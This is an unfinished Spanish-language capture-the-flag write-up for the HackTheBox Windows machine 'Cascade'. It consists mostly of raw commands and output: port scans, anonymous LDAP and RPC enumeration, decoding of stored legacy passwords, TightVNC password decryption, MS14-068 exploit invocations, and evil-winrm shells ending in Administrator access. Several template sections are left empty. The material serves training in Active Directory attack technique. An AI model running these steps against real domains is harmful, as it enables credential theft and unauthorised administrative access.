# Cascade

## Tabla de Contenido <!-- omit from toc -->

- [Cascade](#cascade)
  - [Introducción](#introducción)
    - [Técnicas vistas / Tags](#técnicas-vistas--tags)
    - [Estadísticas](#estadísticas)
  - [Reconocimiento](#reconocimiento)
    - [Escaneo de host](#escaneo-de-host)
      - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
      - [Escaneo específico](#escaneo-específico)
  - [Enumeración](#enumeración)
    - [Servicios](#servicios)
      - [Nombre de servicio - Puerto](#nombre-de-servicio---puerto)
        - [Manual](#manual)
        - [Nombre de herramienta](#nombre-de-herramienta)
  - [Explotación](#explotación)
    - [Tipo de explotación](#tipo-de-explotación)
      - [Pasos previos | Preparación](#pasos-previos--preparación)
      - [Ejecución](#ejecución)
  - [Post Explotación](#post-explotación)
    - [Enumeración](#enumeración-1)
    - [Escalación de privilegios](#escalación-de-privilegios)
  - [Conclusión](#conclusión)
  - [Notas adicionales](#notas-adicionales)
  - [Referencias](#referencias)


## Introducción

### Técnicas vistas / Tags

- LDAP Enumeration
- Técnica 2
- Técnica 3

### Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [Cascade](https://www.hackthebox.com/home/machines/profile/235) |
| OS | Windows |
| Dificultad oficial | Medium |
| Dificultad de comunidad | ![Dificultad]() |
| Puntos | 30 |
| Creadores | [VbScrub](https://www.hackthebox.com/home/users/profile/158833) |

## Reconocimiento

### Escaneo de host

#### Escaneo completo de puertos

```bash
└─$ sudo nmap -sS -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-08 22:28 EDT
Initiating SYN Stealth Scan at 22:28
Scanning 10.10.10.182 [65535 ports]
Discovered open port 139/tcp on 10.10.10.182
Discovered open port 135/tcp on 10.10.10.182
Discovered open port 445/tcp on 10.10.10.182
Discovered open port 53/tcp on 10.10.10.182
Discovered open port 49157/tcp on 10.10.10.182
SYN Stealth Scan Timing: About 14.81% done; ETC: 22:32 (0:02:58 remaining)
Discovered open port 49170/tcp on 10.10.10.182
Discovered open port 3269/tcp on 10.10.10.182
Discovered open port 3268/tcp on 10.10.10.182
Discovered open port 49155/tcp on 10.10.10.182
SYN Stealth Scan Timing: About 42.12% done; ETC: 22:31 (0:01:24 remaining)
Discovered open port 49154/tcp on 10.10.10.182
Discovered open port 49158/tcp on 10.10.10.182
Discovered open port 636/tcp on 10.10.10.182
SYN Stealth Scan Timing: About 75.13% done; ETC: 22:30 (0:00:30 remaining)
Discovered open port 5985/tcp on 10.10.10.182
Discovered open port 88/tcp on 10.10.10.182
Discovered open port 389/tcp on 10.10.10.182
Completed SYN Stealth Scan at 22:30, 111.00s elapsed (65535 total ports)
Nmap scan report for 10.10.10.182
Host is up (0.077s latency).
Not shown: 65520 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49170/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 111.07 seconds
           Raw packets sent: 131130 (5.770MB) | Rcvd: 90 (3.960KB)


└─$ sudo nmap -sU --min-rate 5000 -p- -n -Pn 10.10.10.182
[sudo] password for srrequiem:
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-08 22:57 EDT
Nmap scan report for 10.10.10.182
Host is up (0.072s latency).
Not shown: 65532 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
```

#### Escaneo específico

```bash
└─$ nmap -sCV -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-08 22:33 EDT
Nmap scan report for 10.10.10.182
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-09 02:33:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-05-09T02:34:49
|_  start_date: 2023-05-09T02:22:53
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.54 seconds
```

## Enumeración

### Servicios

#### Nombre de servicio - Puerto

##### Manual

```bash
└─$ dnsrecon -d cascade.local -a -n 10.10.10.182
[*] std: Performing General Enumeration against: cascade.local...
[*] Checking for Zone Transfer for cascade.local name servers
[*] Resolving SOA Record
[+]      SOA casc-dc1.cascade.local 10.10.10.182
[+]      SOA casc-dc1.cascade.local dead:beef::e476:800b:b47d:c174
[*] Resolving NS Records
[*] NS Servers found:
[+]      NS casc-dc1.cascade.local 10.10.10.182
[+]      NS casc-dc1.cascade.local dead:beef::e476:800b:b47d:c174
[*] Removing any duplicate NS server IP Addresses...
[*]
[*] Trying NS server 10.10.10.182
[+] 10.10.10.182 Has port 53 TCP Open
[-] Zone Transfer Failed (Zone transfer error: REFUSED)
[*]
[*] Trying NS server dead:beef::e476:800b:b47d:c174
[-] Zone Transfer Failed for dead:beef::e476:800b:b47d:c174!
[-] Port 53 TCP is being filtered
[*] Checking for Zone Transfer for cascade.local name servers
[*] Resolving SOA Record
[+]      SOA casc-dc1.cascade.local 10.10.10.182
[+]      SOA casc-dc1.cascade.local dead:beef::e476:800b:b47d:c174
[*] Resolving NS Records
[*] NS Servers found:
[+]      NS casc-dc1.cascade.local 10.10.10.182
[+]      NS casc-dc1.cascade.local dead:beef::e476:800b:b47d:c174
[*] Removing any duplicate NS server IP Addresses...
[*]
[*] Trying NS server 10.10.10.182
[+] 10.10.10.182 Has port 53 TCP Open
[-] Zone Transfer Failed (Zone transfer error: REFUSED)
[*]
[*] Trying NS server dead:beef::e476:800b:b47d:c174
[-] Zone Transfer Failed for dead:beef::e476:800b:b47d:c174!
[-] Port 53 TCP is being filtered
[-] A timeout error occurred please make sure you can reach the target DNS Servers
[-] directly and requests are not being filtered. Increase the timeout from 3.0 second
[-] to a higher number with --lifetime <time> option.
```

```bash
└─$ldapsearch -x -H ldap://10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local" > content/ldap.txt

└─$ cat content/ldap.txt
# Data truncada
5519   │ # Ryan Thompson, Users, UK, cascade.local
5520   │ dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
5521   │ objectClass: top
5522   │ objectClass: person
5523   │ objectClass: organizationalPerson
5524   │ objectClass: user
5525   │ cn: Ryan Thompson
5526   │ sn: Thompson
5527   │ givenName: Ryan
5528   │ distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
5529   │ instanceType: 4
5530   │ whenCreated: 20200109193126.0Z
5531   │ whenChanged: 20200323112031.0Z
5532   │ displayName: Ryan Thompson
5533   │ uSNCreated: 24610
5534   │ memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
5535   │ uSNChanged: 295010
5536   │ name: Ryan Thompson
5537   │ objectGUID:: LfpD6qngUkupEy9bFXBBjA==
5538   │ userAccountControl: 66048
5539   │ badPwdCount: 0
5540   │ codePage: 0
5541   │ countryCode: 0
5542   │ badPasswordTime: 132247339091081169
5543   │ lastLogoff: 0
5544   │ lastLogon: 132247339125713230
5545   │ pwdLastSet: 132230718862636251
5546   │ primaryGroupID: 513
5547   │ objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
5548   │ accountExpires: 9223372036854775807
5549   │ logonCount: 2
5550   │ sAMAccountName: r.thompson
5551   │ sAMAccountType: 805306368
5552   │ userPrincipalName: r.thompson@cascade.local
5553   │ objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
5554   │ dSCorePropagationData: 20200126183918.0Z
5555   │ dSCorePropagationData: 20200119174753.0Z
5556   │ dSCorePropagationData: 20200119174719.0Z
5557   │ dSCorePropagationData: 20200119174508.0Z
5558   │ dSCorePropagationData: 16010101000000.0Z
5559   │ lastLogonTimestamp: 132294360317419816
5560   │ msDS-SupportedEncryptionTypes: 0
5561   │ cascadeLegacyPwd: clk0bjVldmE=
# Data truncada

└─$ echo 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

```bash
└─$ grep "sAMAccountName" content/ldap.txt | awk '{print $2}' | grep "\."
s.smith
r.thompson
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
j.allen
i.croft
```

```bash
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

```bash
Found user: CascGuest, uid = 501
Found user: arksvc, uid = 1106
Found user: s.smith, uid = 1107
Found user: r.thompson, uid = 1109
Found user: util, uid = 1111
Found user: j.wakefield, uid = 1116
Found user: s.hickson, uid = 1121
Found user: j.goodhand, uid = 1122
Found user: a.turnbull, uid = 1124
Found user: e.crowe, uid = 1127
Found user: b.hanson, uid = 1128
Found user: d.burman, uid = 1129
Found user: BackupSvc, uid = 1130
Found user: j.allen, uid = 1134
Found user: i.croft, uid = 1135
```

```bash
└─$ for user in $(cat content/users2.txt);do rpcclient -N -U "" 10.10.10.182 -c "lookupnames \"$user\"";done
arksvc S-1-5-21-3332504370-1206983947-1165150453-1106 (User: 1)
s.smith S-1-5-21-3332504370-1206983947-1165150453-1107 (User: 1)
r.thompson S-1-5-21-3332504370-1206983947-1165150453-1109 (User: 1)
util S-1-5-21-3332504370-1206983947-1165150453-1111 (User: 1)
j.wakefield S-1-5-21-3332504370-1206983947-1165150453-1116 (User: 1)
s.hickson S-1-5-21-3332504370-1206983947-1165150453-1121 (User: 1)
j.goodhand S-1-5-21-3332504370-1206983947-1165150453-1122 (User: 1)
a.turnbull S-1-5-21-3332504370-1206983947-1165150453-1124 (User: 1)
e.crowe S-1-5-21-3332504370-1206983947-1165150453-1127 (User: 1)
b.hanson S-1-5-21-3332504370-1206983947-1165150453-1128 (User: 1)
d.burman S-1-5-21-3332504370-1206983947-1165150453-1129 (User: 1)
BackupSvc S-1-5-21-3332504370-1206983947-1165150453-1130 (User: 1)
j.allen S-1-5-21-3332504370-1206983947-1165150453-1134 (User: 1)
i.croft S-1-5-21-3332504370-1206983947-1165150453-1135 (User: 1)

python ms14-068.py -u arksvc@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1106 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u s.smith@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1107 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u r.thompson@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1109 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u util@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1111 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u j.wakefield@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1116 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u s.hickson@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1121 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u j.goodhand@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1122 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u a.turnbull@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1124 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u e.crowe@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1127 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u b.hanson@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1128 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u d.burman@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1129 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u BackupSvc@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1130 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u j.allen@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1134 -d casc-dc1.cascade.local -p ''
python ms14-068.py -u i.croft@cascade.local -s S-1-5-21-3332504370-1206983947-1165150453-1135 -d casc-dc1.cascade.local -p ''

cascade.local\arksvc
cascade.local\s.smith
cascade.local\r.thompson
cascade.local\util
cascade.local\j.wakefield
cascade.local\s.hickson
cascade.local\j.goodhand
cascade.local\a.turnbull
cascade.local\e.crowe
cascade.local\b.hanson
cascade.local\d.burman
cascade.local\BackupSvc
cascade.local\j.allen
cascade.local\i.croft

Account name: CASCADE\administrator
Account name: CASCADE\CascGuest
Account name: CASCADE\krbtgt
Account name: CASCADE\CASC-DC1$
Account name: CASCADE\arksvc
Account name: CASCADE\s.smith
Account name: CASCADE\r.thompson
Account name: CASCADE\util
Account name: CASCADE\j.wakefield
Account name: CASCADE\s.hickson
Account name: CASCADE\j.goodhand
Account name: CASCADE\a.turnbull
Account name: CASCADE\e.crowe
Account name: CASCADE\b.hanson
Account name: CASCADE\d.burman
Account name: CASCADE\BackupSvc
Account name: CASCADE\j.allen
Account name: CASCADE\i.croft

└─$ ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```bash

```


```bash
└─$ tree /tmp/cascade
/tmp/cascade
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps

13 directories, 4 files
```

```bash
└─$ catn /tmp/cascade/IT/Temp/s.smith/VNC\ Install.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

https://github.com/frizb/PasswordDecrypts

```bash
└─$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

```powershell
└─$ evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09

```powershell
*Evil-WinRM* PS C:\Users\arksvc> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
# Data truncada
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

```bash
└─$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles
```

```powershell
└─$ evil-winrm -i 10.10.10.182 -u Administrator -p 'baCT3r1aN00dles'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls -force


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        1/26/2020  11:56 PM            282 desktop.ini
-ar---         5/9/2023   3:23 AM             34 root.txt
```

##### Nombre de herramienta



## Explotación

### Tipo de explotación

#### Pasos previos | Preparación



#### Ejecución



## Post Explotación

### Enumeración



### Escalación de privilegios


## Conclusión


## Notas adicionales


## Referencias

- https://github.com/frizb/PasswordDecrypts
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges